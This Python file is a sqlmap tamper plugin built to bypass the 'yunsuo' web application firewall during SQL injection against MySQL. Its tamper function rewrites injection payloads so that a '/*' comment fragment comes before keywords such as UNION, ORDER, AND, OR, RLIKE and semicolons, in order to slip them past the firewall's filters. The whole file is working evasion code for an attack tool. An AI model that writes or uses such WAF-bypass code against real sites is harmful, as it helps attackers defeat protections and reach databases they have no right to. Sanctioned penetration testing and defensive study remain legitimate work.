#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
Author:pureqh.top
"""

import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass yunsuo by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):

        payload=payload.replace("and","'/*' and")
        payload=payload.replace("ORDER","'/*' order")
        payload=payload.replace("UNION","'/*' union")
        payload=payload.replace("WHERE (","'/*' WHERE")
        payload=payload.replace("||","||'/*'")
        payload=payload.replace("OR (","'/*' OR (")
        payload=payload.replace("RLIKE","'/*' RLIKE")
        payload=payload.replace("&","'/*' '&'")
        payload=payload.replace("+","'/*' +")
        payload=payload.replace("`","'/*' `")
        payload=payload.replace("AND","'/*' AND",1)
        payload=payload.replace("(SELECT (CASE WHEN","'/*' (SELECT (CASE WHEN")
        payload=payload.replace("OPERATION","'/*' 1")
        payload=payload.replace("OR JSON","'/*' OR JSON")
        payload=payload.replace("OR EXP","'/*' OR EXP")
        payload=payload.replace(";","'/*' ;")
        return payload